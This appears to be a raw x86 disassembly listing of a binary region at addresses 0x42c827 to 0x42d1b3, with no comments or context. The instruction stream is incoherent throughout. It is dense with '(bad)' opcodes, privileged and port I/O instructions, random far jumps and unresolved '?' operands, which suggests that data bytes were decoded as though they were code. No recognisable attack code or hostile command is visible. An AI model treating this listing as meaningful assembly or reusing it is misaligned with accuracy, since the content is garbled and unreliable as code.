  42c827:	stos   DWORD PTR es:[edi],eax
  42c828:	scas   al,BYTE PTR es:[edi]
  42c829:	aaa    
  42c82a:	cmp    edx,ecx
  42c82c:	leave  
  42c82d:	inc    ebx
  42c82e:	cmp    eax,0xb8708184
  42c833:	xor    DWORD PTR [esi],ebx
  42c835:	rcl    DWORD PTR [edi-0x6daf0fde],cl
  42c83b:	xchg   esi,eax
  42c83c:	fmul   DWORD PTR [ecx]
  42c83e:	inc    eax
  42c83f:	mov    ds:0xfbcab1e1,eax
  42c844:	sahf   
  42c845:	iret   
  42c846:	cmp    eax,0xca20e4b1
  42c84b:	ins    BYTE PTR es:[edi],dx
  42c84c:	xlat   BYTE PTR ds:[ebx]
  42c84d:	xor    BYTE PTR [ecx],dl
  42c84f:	cwde   
  42c850:	mov    cl,0xd
  42c852:	test   BYTE PTR [eax+0xb871163],cl
  42c858:	test   BYTE PTR [edx+0x5ed17bdb],bh
  42c85e:	xchg   ecx,eax
  42c85f:	retf   
  42c860:	adc    BYTE PTR [eax],0x69
  42c863:	inc    esi
  42c864:	sub    DWORD PTR [edx+edi*4+0x24],ebx
  42c868:	pop    es
  42c869:	push   ebx
  42c86a:	scas   eax,DWORD PTR es:[edi]
  42c86b:	add    ch,BYTE PTR [edx-0x51]
  42c86e:	push   eax
  42c86f:	js     0x42c872
  42c871:	(bad)  [esi-0x56]
  42c874:	push   edi
  42c875:	jge    0x42c832
  42c877:	stos   BYTE PTR es:[edi],al
  42c878:	ror    DWORD PTR [eax],0xc5
  42c87b:	pop    esp
  42c87c:	inc    esp
  42c87d:	and    DWORD PTR [ecx],esi
  42c87f:	xlat   BYTE PTR ds:[ebx]
  42c880:	sub    DWORD PTR [edx-0x13],0xffffffb7
  42c884:	add    ebx,ebx
  42c886:	std    
  42c887:	or     bl,BYTE PTR [ecx+0x89687ed]
  42c88d:	mov    dh,0xa0
  42c88f:	out    0x38,al
  42c891:	or     al,0x4
  42c893:	std    
  42c894:	mov    eax,ds:0xb6d6cddd
  42c899:	dec    edx
  42c89a:	mov    ds:0x584e5b8f,eax
  42c89f:	adc    BYTE PTR [eax],0xde
  42c8a2:	add    BYTE PTR [eax-0x61],ah
  42c8a5:	loope  0x42c8bc
  42c8a7:	inc    eax
  42c8a8:	repnz leave 
  42c8aa:	inc    eax
  42c8ab:	add    al,0x75
  42c8ad:	test   al,0xe3
  42c8af:	cld    
  42c8b0:	adc    BYTE PTR [edx+0x698a04d6],dh
  42c8b6:	dec    esp
  42c8b7:	jnp    0x42c84f
  42c8b9:	hlt    
  42c8ba:	mov    ebx,0xc31d3de3
  42c8bf:	pop    ebp
  42c8c0:	data16 clc 
  42c8c2:	inc    eax
  42c8c3:	sub    BYTE PTR [ebx],0xc7
  42c8c6:	push   cs
  42c8c7:	mov    ebp,DWORD PTR [ebp-0x353bbfd9]
  42c8cd:	pop    ebx
  42c8ce:	mov    al,bl
  42c8d0:	dec    ecx
  42c8d1:	jmpw   0x1e2
  42c8d5:	ds ror ebp,0x28
  42c8d9:	addr16 fwait
  42c8db:	pop    esi
  42c8dc:	rcl    esi,1
  42c8de:	sub    DWORD PTR [esi+0x64],0x838c3a12
  42c8e5:	xchg   ecx,eax
  42c8e6:	in     al,0xae
  42c8e8:	arpl   bx,si
  42c8ea:	fistp  WORD PTR [ebx+esi*8]
  42c8ed:	pop    edx
  42c8ee:	test   DWORD PTR [ecx-0x7fb5bbf7],ebp
  42c8f4:	stos   BYTE PTR es:[edi],al
  42c8f5:	mov    eax,0xd1593a1f
  42c8fa:	pop    ebp
  42c8fb:	into   
  42c8fc:	xchg   ah,cl
  42c8fe:	pop    eax
  42c8ff:	sub    al,0x70
  42c901:	add    edi,ebx
  42c903:	sbb    DWORD PTR ds:0x39c0f724,ebx
  42c909:	add    al,0x64
  42c90b:	add    ecx,DWORD PTR [ebx+0x19]
  42c90e:	inc    eax
  42c90f:	pop    edi
  42c910:	xor    al,BYTE PTR [eax]
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xf6d10ca5
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x49000001,al
  42c98d:	gs jge 0x42c99c
  42c990:	jne    0x42c932
  42c992:	pop    ds
  42c993:	not    dl
  42c995:	retf   
  42c996:	mov    dh,0x2a
  42c998:	popa   
  42c999:	xchg   ebx,eax
  42c99a:	cmp    al,0xaf
  42c99c:	out    0x3f,eax
  42c99e:	lahf   
  42c99f:	adc    eax,0xf3353824
  42c9a4:	adc    eax,0x5a702af1
  42c9a9:	stos   BYTE PTR es:[edi],al
  42c9aa:	pop    edi
  42c9ab:	push   ds
  42c9ac:	mov    ch,0x11
  42c9ae:	unpckhps xmm0,xmm6
  42c9b1:	xor    al,0x32
  42c9b3:	cmp    DWORD PTR [ecx-0x6a4fc4c9],ebx
  42c9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9ba:	out    dx,al
  42c9bb:	repnz addr16 test al,0xb7
  42c9bf:	add    DWORD PTR [esi],ebp
  42c9c1:	mov    fs,WORD PTR [ebx-0x3d]
  42c9c4:	mov    esi,0x3652fabe
  42c9c9:	aas    
  42c9ca:	mov    bl,al
  42c9cc:	popf   
  42c9cd:	dec    edi
  42c9ce:	sti    
  42c9cf:	cli    
  42c9d0:	popf   
  42c9d1:	pusha  
  42c9d2:	cmp    ah,BYTE PTR [edx+0x38]
  42c9d5:	cld    
  42c9d6:	lods   al,BYTE PTR ds:[esi]
  42c9d7:	adc    DWORD PTR [edx],esi
  42c9d9:	sbb    al,0xf3
  42c9db:	xor    bh,BYTE PTR [ebx]
  42c9dd:	jnp    0x42c996
  42c9df:	sub    DWORD PTR [eax],esi
  42c9e1:	inc    esp
  42c9e2:	inc    ecx
  42c9e3:	popa   
  42c9e4:	sahf   
  42c9e5:	mov    ds:0x8ca4b7c3,al
  42c9ea:	mov    ebx,DWORD PTR [ebp+0x3a]
  42c9ed:	into   
  42c9ee:	lock call 0xd192:0x98d668f1
  42c9f6:	mov    DWORD PTR ds:0x42af318f,ebp
  42c9fc:	aaa    
  42c9fd:	out    0x24,eax
  42c9ff:	push   ss
  42ca00:	cmp    bh,BYTE PTR [ecx+0x62]
  42ca03:	and    esi,ebp
  42ca05:	cmp    al,BYTE PTR [edx-0x13cfafc7]
  42ca0b:	mov    ah,0x8f
  42ca0d:	shl    BYTE PTR [edx+0x31],0xf3
  42ca11:	das    
  42ca12:	inc    edx
  42ca13:	lahf   
  42ca14:	mov    dh,0xa8
  42ca16:	pop    ds
  42ca17:	fsub   st(1),st
  42ca19:	jecxz  0x42c9c2
  42ca1b:	push   cs
  42ca1c:	add    bh,BYTE PTR [eax]
  42ca1e:	mov    eax,ds:0x623d5372
  42ca23:	(bad)  
  42ca24:	in     al,dx
  42ca25:	mov    bh,0x4d
  42ca27:	mov    cl,0xf9
  42ca29:	sbb    eax,esp
  42ca2b:	mov    cl,0x92
  42ca2d:	jnp    0x42ca2f
  42ca2f:	adc    dl,ch
  42ca31:	jmp    0x6b6b:0x295a2ac
  42ca38:	sbb    DWORD PTR [edx],ebx
  42ca3a:	or     esi,DWORD PTR ds:0x5e6e69df
  42ca40:	sbb    eax,0xb67feab1
  42ca45:	mov    bh,0xd2
  42ca47:	pop    ss
  42ca48:	std    
  42ca49:	jns    0x42cabe
  42ca4b:	and    ebx,DWORD PTR [ebx+esi*4]
  42ca4e:	sub    ebp,edi
  42ca50:	(bad)  
  42ca51:	loope  0x42ca4d
  42ca53:	or     esp,DWORD PTR [esi+0x26]
  42ca56:	xchg   BYTE PTR [edx],ch
  42ca58:	jne    0x42ca02
  42ca5a:	ins    DWORD PTR es:[edi],dx
  42ca5b:	fwait
  42ca5c:	jno    0x42ca7f
  42ca5e:	fstp   QWORD PTR ds:0x4f2d9741
  42ca64:	lds    esi,FWORD PTR [ecx+0x2c]
  42ca67:	mov    edi,0x5d19008f
  42ca6c:	out    0x82,al
  42ca6e:	shr    DWORD PTR [esi-0x74],cl
  42ca71:	inc    ebp
  42ca72:	mov    ecx,0x4ff0b38e
  42ca77:	or     eax,0xa6fd7cf7
  42ca7c:	(bad)  
  42ca7d:	sti    
  42ca7e:	and    al,0x43
  42ca80:	dec    edx
  42ca81:	push   ebp
  42ca82:	pushf  
  42ca83:	fldenv [ecx-0x123ca93f]
  42ca89:	mov    WORD PTR [edx+0x18],?
  42ca8c:	retf   
  42ca8d:	std    
  42ca8e:	pop    ebx
  42ca8f:	mov    edi,0x59
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0xb76ec0]
  42cb02:	aam    0xe4
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x89000001
  42cb0d:	jns    0x42ca8f
  42cb0f:	lds    eax,FWORD PTR [esi-0x9]
  42cb12:	aad    0xe2
  42cb14:	sub    eax,0x82c1337a
  42cb19:	jne    0x42cb4f
  42cb1b:	imul   eax,DWORD PTR [edi-0x188e509c],0x4e
  42cb22:	push   ds
  42cb23:	xchg   ecx,eax
  42cb24:	mov    dh,0x71
  42cb26:	gs cli 
  42cb28:	and    esi,edx
  42cb2a:	test   BYTE PTR [ecx-0x69],dl
  42cb2d:	cmp    BYTE PTR [edi-0x1a],0x7a
  42cb31:	daa    
  42cb32:	xor    DWORD PTR [edi-0x2f3d52d8],ebp
  42cb38:	inc    ebp
  42cb39:	lahf   
  42cb3a:	mov    DWORD PTR [ebx],esi
  42cb3c:	call   0x2dbe:0xa440a37d
  42cb43:	loope  0x42cafe
  42cb45:	in     eax,dx
  42cb46:	add    edx,DWORD PTR [ecx]
  42cb48:	or     ch,bh
  42cb4a:	jb     0x42cb26
  42cb4c:	fnsave [eax]
  42cb4e:	shl    BYTE PTR [ecx+0x53b4d267],0xf3
  42cb55:	out    dx,eax
  42cb56:	stos   BYTE PTR es:[edi],al
  42cb57:	cld    
  42cb58:	cdq    
  42cb59:	push   ebx
  42cb5a:	les    ebp,FWORD PTR [eax]
  42cb5c:	icebp  
  42cb5d:	mov    al,0x15
  42cb5f:	iret   
  42cb60:	cli    
  42cb61:	daa    
  42cb62:	xor    edx,DWORD PTR [ebp+0x76]
  42cb65:	mov    al,0xd
  42cb67:	repz cs inc eax
  42cb6a:	dec    eax
  42cb6b:	in     al,dx
  42cb6c:	mov    ds:0x2bf05397,eax
  42cb71:	cmp    ebp,DWORD PTR [esi+0x66]
  42cb74:	inc    ecx
  42cb75:	jl     0x42cb02
  42cb77:	mov    eax,ds:0xdac39df7
  42cb7c:	test   eax,0x3a83c99f
  42cb81:	into   
  42cb82:	stc    
  42cb83:	int    0x20
  42cb85:	stos   DWORD PTR es:[edi],eax
  42cb86:	stos   DWORD PTR es:[edi],eax
  42cb87:	ins    DWORD PTR es:[edi],dx
  42cb88:	mov    edx,0x17f41335
  42cb8d:	push   eax
  42cb8e:	(bad)  
  42cb8f:	sbb    al,dl
  42cb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb92:	mov    ebp,0x2fd61f18
  42cb97:	mov    ds:0x1ad243d9,al
  42cb9c:	jp     0x42cb80
  42cb9e:	mov    eax,0x923df5e6
  42cba3:	fistp  DWORD PTR [ebx+0x6a]
  42cba6:	add    DWORD PTR [edx+edi*1-0x70f4109f],ebp
  42cbad:	aaa    
  42cbae:	mov    edx,0xced79d6c
  42cbb3:	inc    BYTE PTR [eax+0xfc39623]
  42cbb9:	sar    BYTE PTR [edi-0x46f7ec99],0x40
  42cbc0:	dec    edi
  42cbc1:	mov    eax,0x9603d833
  42cbc6:	mov    bh,0xb4
  42cbc8:	add    eax,0x74e315e1
  42cbcd:	jne    0x42cb6e
  42cbcf:	ins    BYTE PTR es:[edi],dx
  42cbd0:	jae    0x42cbb1
  42cbd2:	iret   
  42cbd3:	adc    al,0x17
  42cbd5:	jmp    0xf26b466d
  42cbda:	mov    BYTE PTR [edx-0x70aecd5e],bh
  42cbe0:	outs   dx,DWORD PTR ds:[esi]
  42cbe1:	imul   esp,DWORD PTR [esi+0x1736343f],0x78
  42cbe8:	or     al,cl
  42cbea:	cmp    ecx,DWORD PTR [esi-0x3f424c39]
  42cbf0:	and    WORD PTR [eax-0x5fcb599],0x5c2
  42cbf9:	inc    edi
  42cbfa:	jge    0x42cbad
  42cbfc:	shl    DWORD PTR [eax-0xb],cl
  42cbff:	je     0x42cbf0
  42cc01:	cmc    
  42cc02:	sbb    al,0x2b
  42cc04:	in     al,dx
  42cc05:	jl     0x42cbba
  42cc07:	xchg   ebp,eax
  42cc08:	ret    0x370f
  42cc0b:	into   
  42cc0c:	and    eax,0x8be10c66
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x2d1204e4
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xa1000001
  42cc8d:	sahf   
  42cc8e:	call   0xa6c3:0x87cd4929
  42cc95:	add    eax,0xbcb97f63
  42cc9a:	push   cs
  42cc9b:	cmp    BYTE PTR [esi+ebp*8],0xbc
  42cc9f:	jmp    0x99ceac8b
  42cca4:	std    
  42cca5:	mov    esi,0xe7821b92
  42ccaa:	pop    ss
  42ccab:	js     0x42cc76
  42ccad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccae:	mov    bl,0xf7
  42ccb0:	fimul  DWORD PTR [edi]
  42ccb2:	ins    BYTE PTR es:[edi],dx
  42ccb3:	pop    eax
  42ccb4:	scas   eax,DWORD PTR es:[edi]
  42ccb5:	push   esi
  42ccb6:	inc    esi
  42ccb7:	xor    eax,0x9aec14c6
  42ccbc:	sub    DWORD PTR [esi-0x50671714],esp
  42ccc2:	fnstcw WORD PTR [eax]
  42ccc4:	imul   edi,DWORD PTR [esi+0x2219bd76],0x97ef6bca
  42ccce:	mov    cl,0x3b
  42ccd0:	jb     0x42cd16
  42ccd2:	daa    
  42ccd3:	addr16 dec esi
  42ccd5:	push   0xffffffb1
  42ccd7:	test   eax,0xe64c3af
  42ccdc:	pop    ebx
  42ccdd:	add    cl,BYTE PTR [edx]
  42ccdf:	outs   dx,BYTE PTR ds:[esi]
  42cce0:	xchg   edx,eax
  42cce1:	pop    ss
  42cce2:	aad    0xf3
  42cce4:	and    ecx,DWORD PTR [eax+0x6d]
  42cce7:	sub    ebp,DWORD PTR [ebx-0x3a5b6624]
  42cced:	out    0xdb,al
  42ccef:	or     eax,edi
  42ccf1:	jge    0x42cccc
  42ccf3:	fistp  DWORD PTR [esi-0x65c1df70]
  42ccf9:	test   al,0xc7
  42ccfb:	inc    ecx
  42ccfc:	or     ecx,DWORD PTR [ecx+0x73159231]
  42cd02:	sub    ebx,DWORD PTR [edx+0x6ecd85e9]
  42cd08:	jmp    0x42cd02
  42cd0a:	push   ds
  42cd0b:	dec    esp
  42cd0c:	jl     0x42ccf6
  42cd0e:	das    
  42cd0f:	push   eax
  42cd10:	rcr    DWORD PTR [edx-0x2fc56411],1
  42cd16:	push   0x35
  42cd18:	inc    esi
  42cd19:	adc    BYTE PTR [edx],bl
  42cd1b:	jg     0x42ccd0
  42cd1d:	fsubp  st(4),st
  42cd1f:	in     al,dx
  42cd20:	jbe    0x42ccad
  42cd22:	adc    eax,0x3c25e97b
  42cd27:	sub    BYTE PTR [esi-0x7d],0x3b
  42cd2b:	(bad)  [eax-0x26]
  42cd2e:	inc    esp
  42cd2f:	out    0x39,eax
  42cd31:	hlt    
  42cd32:	xchg   esi,eax
  42cd33:	cmp    DWORD PTR [ebx+edi*8],0x7dc33aa4
  42cd3a:	xchg   esp,eax
  42cd3b:	mov    ecx,0xfbf6b457
  42cd40:	scas   eax,DWORD PTR es:[edi]
  42cd41:	imul   ebx,edx,0xc4050429
  42cd47:	js     0x42cd43
  42cd49:	push   es
  42cd4a:	cmp    eax,0xd20f14b3
  42cd50:	inc    edi
  42cd51:	sbb    BYTE PTR [eax],bh
  42cd53:	jns    0x42cd15
  42cd55:	mov    edi,0x19933db8
  42cd5a:	xchg   ebp,eax
  42cd5b:	and    eax,0x95775dae
  42cd60:	and    al,0x86
  42cd62:	jmp    0x42cd72
  42cd64:	push   edi
  42cd65:	(bad)  
  42cd66:	fisttp QWORD PTR [eax+0x10]
  42cd69:	inc    esi
  42cd6a:	test   DWORD PTR [esi-0x73],edx
  42cd6d:	out    0x80,eax
  42cd6f:	jmp    0xf354:0xff8ed7a6
  42cd76:	dec    ebp
  42cd77:	sbb    eax,0x228454b2
  42cd7c:	fist   DWORD PTR [eax+0x660a8b1f]
  42cd82:	in     eax,0x7
  42cd84:	cld    
  42cd85:	mov    ah,0xa5
  42cd87:	lock jg 0x42cd5a
  42cd8a:	jae    0x42cdaf
  42cd8c:	hlt    
  42cd8d:	bnd ret 
  42cd8f:	aam    0x70
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x1e
  42ce01:	push   0xe10e90e2
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    eax,0xa5000001
  42ce0d:	fmul   QWORD PTR [esi+esi*1-0x7c]
  42ce11:	push   esi
  42ce12:	cmp    al,0x3
  42ce14:	loop   0x42ce62
  42ce16:	int    0xd1
  42ce18:	mov    dl,0xd7
  42ce1a:	aam    0xab
  42ce1c:	popf   
  42ce1d:	push   ds
  42ce1e:	sbb    eax,0x3f91e0df
  42ce23:	sbb    ebp,DWORD PTR [ecx]
  42ce25:	inc    eax
  42ce26:	push   edi
  42ce27:	sbb    ebp,eax
  42ce29:	jecxz  0x42ce2d
  42ce2b:	mov    edi,0x5a18c4b8
  42ce30:	adc    ah,bl
  42ce32:	lods   eax,DWORD PTR ds:[esi]
  42ce33:	add    esp,DWORD PTR [eax*8-0x6f8df29d]
  42ce3a:	sub    DWORD PTR [edi+eax*8-0x79f20210],esp
  42ce41:	(bad)  
  42ce43:	pusha  
  42ce44:	add    al,0xad
  42ce46:	add    DWORD PTR [esi+0x2f379357],ebx
  42ce4c:	fistp  WORD PTR [ebx]
  42ce4e:	jae    0x42ce50
  42ce50:	inc    edi
  42ce52:	push   ebp
  42ce53:	(bad)  
  42ce54:	mov    al,ds:0x9ca7922
  42ce59:	(bad)  
  42ce5b:	push   ecx
  42ce5c:	cwde   
  42ce5d:	and    al,0x4e
  42ce5f:	pop    es
  42ce60:	pop    ss
  42ce61:	scas   eax,DWORD PTR es:[edi]
  42ce62:	int3   
  42ce63:	xchg   ebp,eax
  42ce64:	xchg   cl,dh
  42ce66:	in     al,0xad
  42ce68:	fistp  QWORD PTR ds:0xf099bcec
  42ce6e:	shl    DWORD PTR [esi+ebx*2],0xde
  42ce72:	mov    edi,0x6daaf560
  42ce77:	aaa    
  42ce78:	mov    ah,0xa2
  42ce7a:	inc    edx
  42ce7b:	mov    ebp,0x45ae723a
  42ce80:	sub    BYTE PTR ds:0xa2c889b2,dl
  42ce86:	(bad)  
  42ce87:	xlat   BYTE PTR ds:[ebx]
  42ce88:	ret    
  42ce89:	sbb    DWORD PTR [eax+0x45],0x69
  42ce8d:	lods   al,BYTE PTR ds:[esi]
  42ce8e:	cmc    
  42ce8f:	fcmovb st,st(2)
  42ce91:	mov    esp,0x50579b88
  42ce96:	inc    esp
  42ce97:	inc    eax
  42ce98:	scas   al,BYTE PTR es:[edi]
  42ce99:	arpl   WORD PTR [esi+0x197e621b],sp
  42ce9f:	dec    edi
  42cea0:	dec    edx
  42cea1:	push   cs
  42cea2:	cmp    eax,0xbd39ed84
  42cea7:	outs   dx,BYTE PTR ds:[esi]
  42cea8:	xchg   esp,eax
  42cea9:	jne    0x42cefd
  42ceab:	loop   0x42ce2f
  42cead:	sbb    ecx,0x70
  42ceb0:	inc    esi
  42ceb1:	arpl   WORD PTR [ecx],dx
  42ceb3:	jg     0x42cea4
  42ceb5:	fwait
  42ceb6:	xchg   edi,eax
  42ceb7:	(bad)  
  42ceb8:	sub    al,0xa
  42ceba:	iret   
  42cebb:	stos   BYTE PTR es:[edi],al
  42cebc:	add    cl,BYTE PTR [edx]
  42cebe:	sub    DWORD PTR [eax+esi*4+0x2f],0xffffffe4
  42cec3:	or     ah,BYTE PTR fs:[eax]
  42cec6:	push   ds
  42cec7:	push   0xffffffb0
  42cec9:	dec    esi
  42ceca:	push   0xffffffc5
  42cecc:	imul   edi,DWORD PTR [eax],0xfffffff0
  42cecf:	shl    DWORD PTR [edi],0xf5
  42ced2:	ja     0x42cee6
  42ced4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ced5:	out    dx,al
  42ced6:	jg     0x42ceab
  42ced8:	in     al,dx
  42ced9:	lahf   
  42ceda:	fst    QWORD PTR [edi-0x548b9ba9]
  42cee0:	push   ecx
  42cee1:	cmp    DWORD PTR [edi+ecx*2+0x2a],ebp
  42cee5:	adc    edx,DWORD PTR [edx-0x1b]
  42cee8:	lock or al,0x2e
  42ceeb:	jnp    0x42ce6f
  42ceed:	push   esi
  42ceee:	jp     0x42ce75
  42cef0:	sbb    cl,bl
  42cef2:	adc    bl,BYTE PTR [ebp-0x4380c864]
  42cef8:	mov    eax,0xe8784348
  42cefd:	fwait
  42cefe:	or     al,0x53
  42cf00:	mov    esp,0x19539d0b
  42cf05:	pusha  
  42cf06:	push   0x2414d683
  42cf0b:	das    
  42cf0c:	xor    ecx,edx
  42cf0e:	mov    ch,0x51
  42cf10:	xor    DWORD PTR [eax],eax
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR [eax]
  42cf81:	(bad)  
  42cf83:	not    BYTE PTR [ebx]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0x6c000001,al
  42cf8d:	adc    ecx,DWORD PTR [eax-0x64]
  42cf90:	inc    edx
  42cf91:	inc    ecx
  42cf92:	ins    DWORD PTR es:[edi],dx
  42cf93:	pop    esp
  42cf94:	dec    edx
  42cf95:	dec    eax
  42cf96:	into   
  42cf97:	fild   QWORD PTR [ebp-0x59]
  42cf9a:	pop    ebp
  42cf9b:	push   esp
  42cf9c:	lahf   
  42cf9d:	out    0x1,eax
  42cf9f:	(bad)  
  42cfa0:	mov    ds:0xba75a1fb,al
  42cfa5:	pop    edi
  42cfa6:	jge    0x42cfeb
  42cfa8:	jo     0x42d025
  42cfaa:	cmc    
  42cfab:	aam    0xed
  42cfad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfae:	push   ebp
  42cfaf:	xor    eax,0xd6503272
  42cfb4:	pop    ds
  42cfb5:	jne    0x42cf48
  42cfb7:	jecxz  0x42d00e
  42cfb9:	je     0x42cfe2
  42cfbb:	inc    esi
  42cfbc:	adc    esp,DWORD PTR [edi-0x41]
  42cfbf:	add    al,0x79
  42cfc1:	pusha  
  42cfc2:	(bad)  [ebx]
  42cfc4:	xchg   esi,eax
  42cfc5:	sbb    DWORD PTR [ebp+0x753f7da4],ebx
  42cfcb:	dec    eax
  42cfcc:	sub    al,0xd4
  42cfce:	aam    0x6
  42cfd0:	xchg   esp,eax
  42cfd1:	cmp    al,0x2a
  42cfd3:	adc    al,BYTE PTR [ecx]
  42cfd5:	mov    ecx,0x2ef4dd54
  42cfda:	mov    eax,ds:0x84ed4abd
  42cfdf:	fstp   TBYTE PTR [esi-0x46e64299]
  42cfe5:	mov    edi,?
  42cfe7:	sbb    DWORD PTR [edi+0x1c],0x41
  42cfeb:	frstor [edi+0x6c29587d]
  42cff1:	and    al,0xcb
  42cff3:	dec    ebx
  42cff4:	aad    0x5d
  42cff6:	pop    eax
  42cff7:	(bad)  
  42cff8:	arpl   WORD PTR [ecx+0x6],cx
  42cffb:	inc    edi
  42cffc:	(bad)  
  42cffd:	repnz mov WORD PTR [ebx+0xf],gs
  42d001:	adc    ebp,edi
  42d003:	jge    0x42d02b
  42d005:	inc    esp
  42d006:	fidiv  WORD PTR [edx]
  42d008:	test   al,0x31
  42d00a:	mov    bh,0x1
  42d00c:	push   ss
  42d00d:	mov    eax,ds:0xde21c728
  42d012:	sbb    al,0xdd
  42d014:	(bad)  
  42d015:	xor    eax,0xac511c76
  42d01a:	mov    edi,0x8936afe4
  42d01f:	pop    eax
  42d020:	mov    ?,ebx
  42d022:	add    DWORD PTR [edx-0x190a4b76],eax
  42d028:	fs dec eax
  42d02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d02b:	pop    es
  42d02c:	lock pop ebx
  42d02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d02f:	retf   
  42d030:	ror    ch,0xa5
  42d033:	mov    edi,0x9d0ceb0a
  42d038:	cld    
  42d039:	and    ebx,DWORD PTR [ecx+edi*8-0x12]
  42d03d:	fcom   QWORD PTR [ebx]
  42d03f:	sbb    BYTE PTR es:[esi-0x4fc06c7d],ch
  42d046:	push   ss
  42d047:	jne    0x42d03a
  42d049:	xlat   BYTE PTR ds:[ebx]
  42d04a:	dec    ecx
  42d04b:	bnd jnp 0x42d008
  42d04e:	scas   al,BYTE PTR es:[edi]
  42d04f:	fild   QWORD PTR [ecx-0x66]
  42d052:	add    dl,BYTE PTR [ecx-0x5c]
  42d055:	push   es
  42d056:	mov    esi,0x1a7b70a7
  42d05b:	test   BYTE PTR [ecx],cl
  42d05d:	call   0xad86c2d6
  42d062:	int3   
  42d063:	sbb    al,0xd1
  42d065:	loopne 0x42d0cf
  42d067:	push   eax
  42d068:	(bad)  
  42d069:	mov    BYTE PTR cs:[eax+0x4b58c8a8],0xf2
  42d071:	xchg   esp,eax
  42d072:	or     DWORD PTR [ebx+0x1373f8e3],0xffffffdf
  42d079:	into   
  42d07a:	dec    ebx
  42d07b:	ins    BYTE PTR es:[edi],dx
  42d07c:	mov    BYTE PTR [ecx-0x50fd5dc8],bl
  42d082:	mov    al,BYTE PTR [esi+edx*4+0x17eab754]
  42d089:	xchg   ebx,eax
  42d08a:	rol    DWORD PTR [eax],0x9a
  42d08d:	loop   0x42d0dd
  42d08f:	jnp    0x42d065
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR ds:0x187cdc52,bh
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x60000001,al
  42d10d:	pusha  
  42d10e:	(bad)  
  42d10f:	repz cmp eax,0x40485de5
  42d115:	lods   al,BYTE PTR ds:[esi]
  42d116:	or     eax,0x775ee343
  42d11b:	xchg   edi,eax
  42d11c:	test   eax,0x64eee1e
  42d121:	js     0x42d11b
  42d123:	mov    esi,0xe3d41c5b
  42d128:	inc    ebx
  42d129:	and    DWORD PTR [edx],ecx
  42d12b:	pusha  
  42d12c:	adc    DWORD PTR [esi-0x72e35099],0x3e
  42d133:	ret    0xc71
  42d136:	pop    ebp
  42d137:	repz lahf 
  42d139:	cld    
  42d13a:	cwde   
  42d13b:	inc    edx
  42d13c:	inc    ecx
  42d13d:	retf   
  42d13e:	inc    esi
  42d13f:	xchg   BYTE PTR [eax+0x7],dh
  42d142:	mov    ebx,0x39096c7b
  42d147:	pop    esp
  42d148:	call   0x9774:0x502b21f5
  42d14f:	lock rol DWORD PTR [edi+ebp*2-0x391122c1],cl
  42d157:	shr    BYTE PTR [ebx],1
  42d159:	or     DWORD PTR [ecx-0x725d9b8],ecx
  42d15f:	push   edi
  42d160:	push   edi
  42d161:	fst    st(2)
  42d163:	out    0x7d,eax
  42d165:	mov    ds:0xbd8615d3,al
  42d16a:	jle    0x42d14d
  42d16c:	xor    DWORD PTR [edi-0x49],edi
  42d16f:	aad    0xe5
  42d171:	out    dx,eax
  42d172:	inc    ebx
  42d173:	mov    edx,fs
  42d175:	push   eax
  42d176:	xor    al,0x37
  42d178:	loop   0x42d193
  42d17a:	in     eax,dx
  42d17b:	push   0xd5bf9be6
  42d180:	ss inc eax
  42d182:	cs push 0xd3db1369
  42d188:	dec    esi
  42d189:	nop
  42d18a:	mov    ah,ah
  42d18c:	jg     0x42d1a7
  42d18e:	jmp    0x29be:0x5555b85b
  42d195:	dec    eax
  42d196:	sahf   
  42d197:	adc    esi,DWORD PTR [ebp+0x1b]
  42d19a:	imul   edx,DWORD PTR [edi-0x45681da8],0x13dad82
  42d1a4:	sub    al,0x4f
  42d1a6:	mov    ds:0x1d24e66e,eax
  42d1ab:	repnz outs dx,DWORD PTR ds:[esi]
  42d1ad:	ss xchg esi,eax
  42d1af:	jge    0x42d20f
  42d1b1:	pop    esi
  42d1b2:	dec    ecx
  42d1b3:	inc    esp
